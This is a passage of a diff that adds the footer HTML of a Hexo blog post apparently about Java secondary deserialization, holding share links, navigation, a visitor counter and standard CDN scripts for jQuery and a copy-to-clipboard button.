+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&title=Java二次反序列化学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&name=Java二次反序列化学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/&t=Java二次反序列化学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
